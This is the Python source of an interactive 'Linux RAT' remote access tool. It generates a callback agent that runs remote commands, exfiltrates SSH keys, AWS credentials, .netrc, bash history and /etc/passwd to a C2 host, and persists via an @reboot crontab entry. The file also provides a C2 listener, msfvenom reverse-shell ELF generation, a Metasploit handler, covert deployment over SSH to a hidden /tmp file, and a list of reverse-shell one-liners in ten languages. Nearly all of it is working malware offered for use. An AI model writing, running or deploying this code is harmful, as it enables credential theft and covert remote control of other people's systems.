#!/usr/bin/env python3
import os, sys, subprocess, base64, json, socket, threading, time, shutil

RED="\033[91m"; YEL="\033[93m"; CYN="\033[96m"; GRN="\033[92m"
WHT="\033[97m"; DIM="\033[2m";  RST="\033[0m"

LOGO = f"""{RED}
  ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗    ██████╗  █████╗ ████████╗
  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝    ██╔══██╗██╔══██╗╚══██╔══╝
  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝     ██████╔╝███████║   ██║
  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗     ██╔══██╗██╔══██║   ██║
  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗    ██║  ██║██║  ██║   ██║
  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝{RST}
{DIM}                    [ linux remote access tool ]{RST}
"""

MENU = f"""
{YEL}┌──────────────────────────────────────────────────────┐
│                {WHT}LINUX RAT OPTIONS{YEL}                    │
├──────────────────────────────────────────────────────┤
│  {CYN}[1]{YEL}  Generate Python agent                        │
│  {CYN}[2]{YEL}  Generate ELF reverse shell (msfvenom)        │
│  {CYN}[3]{YEL}  Start C2 listener (built-in)                 │
│  {CYN}[4]{YEL}  Start Metasploit listener                    │
│  {CYN}[5]{YEL}  Deploy agent via SSH                         │
│  {CYN}[6]{YEL}  Quick netcat listener                        │
│  {CYN}[7]{YEL}  Reverse shell one-liners (copy)              │
│  {CYN}[0]{YEL}  Back                                         │
└──────────────────────────────────────────────────────┘{RST}
"""

# ── embedded agent (same as previous build, compact) ─────────────────────────
AGENT_TEMPLATE = '''#!/usr/bin/env python3
import socket,subprocess,os,threading,time,json,base64
C2_HOST="{host}"
C2_PORT={port}
def sh(cmd):
    r=subprocess.run(cmd,shell=True,capture_output=True,timeout=30)
    return (r.stdout+r.stderr).decode(errors="replace") or "[no output]"
def send(s,d):
    p=d.encode();s.sendall(len(p).to_bytes(4,"big")+p)
def recv(s):
    n=int.from_bytes(s.recv(4),"big");d=b""
    while len(d)<n:d+=s.recv(4096)
    return json.loads(d)
def exfil():
    import glob,pathlib
    o={{}}
    for k,v in {{"history":"~/.bash_history","ssh":"~/.ssh/id_rsa","aws":"~/.aws/credentials","netrc":"~/.netrc"}}.items():
        p=pathlib.Path(v).expanduser()
        o[k]=p.read_text(errors="replace")[:4096] if p.is_file() else "[missing]"
    o["passwd"]=sh("cat /etc/passwd")
    o["whoami"]=sh("whoami && id && hostname -I")
    return json.dumps(o)
def loop(s):
    send(s,json.dumps({{"hello":sh("whoami")+" @ "+sh("hostname")+" | "+sh("uname -r")}}))
    while True:
        pkt=recv(s);cmd=pkt.get("cmd","").upper();args=pkt.get("args","")
        if cmd=="EXIT":break
        elif cmd=="SHELL": res=sh(args)
        elif cmd=="EXFIL": res=exfil()
        elif cmd=="GET":
            try: res="FILE_B64:"+base64.b64encode(open(args,"rb").read()).decode()
            except Exception as e: res=f"[err]{{e}}"
        elif cmd=="PUT":
            p,b=args.split(":",1)
            open(p,"wb").write(base64.b64decode(b)); res=f"wrote {{p}}"
        elif cmd=="PERSIST":
            cur=__import__("subprocess").getoutput("crontab -l 2>/dev/null")
            line=f"@reboot python3 {{os.path.abspath(__file__)}}\\n"
            if line not in cur:
                import subprocess as sp
                p2=sp.Popen(["crontab","-"],stdin=sp.PIPE);p2.communicate((cur+"\\n"+line).encode())
            res="persisted"
        else: res=f"unknown cmd: {{cmd}}"
        send(s,json.dumps({{"status":"ok","data":res}}))
while True:
    try:
        s=socket.socket();s.connect((C2_HOST,C2_PORT));s.settimeout(None);loop(s);s.close()
    except:pass
    time.sleep(15)
'''

def clear(): os.system("clear")

def sh(cmd): return os.popen(cmd).read().strip()

# ── C2 listener (reused from previous build) ──────────────────────────────────
def c2_listener(port):
    def send_msg(sock, data):
        p=data.encode(); sock.sendall(len(p).to_bytes(4,"big")+p)
    def recv_msg(sock):
        n=int.from_bytes(sock.recv(4),"big"); d=b""
        while len(d)<n: d+=sock.recv(4096)
        return d.decode(errors="ignore")

    srv=socket.socket(); srv.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    srv.bind(("0.0.0.0",port)); srv.listen(5)
    print(f"\n{GRN}[+] C2 listening on :{port} — waiting for agent...{RST}")
    conn,addr=srv.accept()
    hello=json.loads(recv_msg(conn))
    print(f"{GRN}[+] agent: {hello}{RST}\n")
    while True:
        try:
            line=input(f"{RED}shell{RST} {YEL}>{RST} ").strip()
            if not line: continue
            parts=line.split(None,1); cmd=parts[0].upper(); args=parts[1] if len(parts)>1 else ""
            send_msg(conn,json.dumps({"cmd":cmd,"args":args}))
            if cmd=="EXIT": break
            resp=json.loads(recv_msg(conn))
            print(resp.get("data",""))
        except (KeyboardInterrupt,BrokenPipeError): break
    conn.close(); srv.close()

# ── one-liners ────────────────────────────────────────────────────────────────
def show_oneliners(lhost, lport):
    shells = [
        ("bash",      f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"),
        ("bash 2",    f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196"),
        ("python3",   f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"),
        ("perl",      f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"),
        ("php",       f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
        ("nc",        f"nc -e /bin/sh {lhost} {lport}"),
        ("nc mkfifo", f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"),
        ("socat",     f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}"),
        ("ruby",      f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"),
        ("awk",       f"awk 'BEGIN{{s=\"/inet/tcp/0/{lhost}/{lport}\";while(42){{do{{printf \"shell>\" |& s;s |& getline c;print c;while((c |& getline)>0)print|&s;close(c)}}while(c!=\"exit\")}}}}' /dev/null"),
    ]
    print(f"\n{CYN}[ REVERSE SHELL ONE-LINERS ]{RST}  LHOST={lhost} LPORT={lport}\n")
    for name, cmd in shells:
        print(f"  {YEL}{name}{RST}")
        print(f"  {DIM}{cmd}{RST}\n")
    input(f"{DIM}press enter{RST}")

# ── handlers ──────────────────────────────────────────────────────────────────
def gen_agent():
    lhost=input(f"  C2 IP: ").strip()
    lport=input(f"  C2 PORT [4444]: ").strip() or "4444"
    out=input(f"  output file [agent.py]: ").strip() or "agent.py"
    code=AGENT_TEMPLATE.format(host=lhost, port=int(lport))
    with open(out,"w") as f: f.write(code)
    print(f"{GRN}[+] agent written to {out}{RST}")
    input(f"\n{DIM}press enter{RST}")

def gen_elf():
    if not shutil.which("msfvenom"): print(f"{RED}[!] msfvenom not found{RST}"); input(); return
    lhost=input("  LHOST: ").strip(); lport=input("  LPORT [4444]: ").strip() or "4444"
    out=input("  output [shell.elf]: ").strip() or "shell.elf"
    os.system(f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf > {out}")
    os.system(f"chmod +x {out}")
    print(f"{GRN}[+] {out}{RST}")
    input(f"\n{DIM}press enter{RST}")

def start_c2():
    port=input("  listen port [4444]: ").strip() or "4444"
    c2_listener(int(port))
    input(f"\n{DIM}press enter{RST}")

def msf_listener():
    if not shutil.which("msfconsole"): print(f"{RED}[!] msfconsole not found{RST}"); input(); return
    lhost=input("  LHOST: ").strip(); lport=input("  LPORT [4444]: ").strip() or "4444"
    rc="/tmp/syp_linux.rc"
    open(rc,"w").write(f"use exploit/multi/handler\nset payload linux/x64/meterpreter/reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nexploit\n")
    os.system(f"msfconsole -r {rc}")
    input(f"\n{DIM}press enter{RST}")

def ssh_deploy():
    lhost=input("  C2 IP: ").strip(); lport=input("  C2 PORT [4444]: ").strip() or "4444"
    target=input("  SSH target (user@host): ").strip()
    code=AGENT_TEMPLATE.format(host=lhost, port=int(lport))
    with open("/tmp/syp_agent.py","w") as f: f.write(code)
    os.system(f"scp /tmp/syp_agent.py {target}:/tmp/.syp_daemon.py")
    os.system(f"ssh {target} 'nohup python3 /tmp/.syp_daemon.py &'")
    print(f"{GRN}[+] deployed and running{RST}")
    input(f"\n{DIM}press enter{RST}")

def nc_listener():
    port=input("  port [4444]: ").strip() or "4444"
    os.system(f"nc -lvnp {port}")
    input(f"\n{DIM}press enter{RST}")

def one_liners():
    lhost=input("  LHOST: ").strip(); lport=input("  LPORT [4444]: ").strip() or "4444"
    show_oneliners(lhost, lport)

ACTIONS={"1":gen_agent,"2":gen_elf,"3":start_c2,"4":msf_listener,"5":ssh_deploy,"6":nc_listener,"7":one_liners}

def main():
    while True:
        clear(); print(LOGO); print(MENU)
        c=input(f"{RED}rat-linux{RST} {YEL}>{RST} ").strip()
        if c=="0": break
        if c in ACTIONS: ACTIONS[c]()
        else: input(f"{YEL}[?] invalid — enter{RST}")

if __name__=="__main__": main()
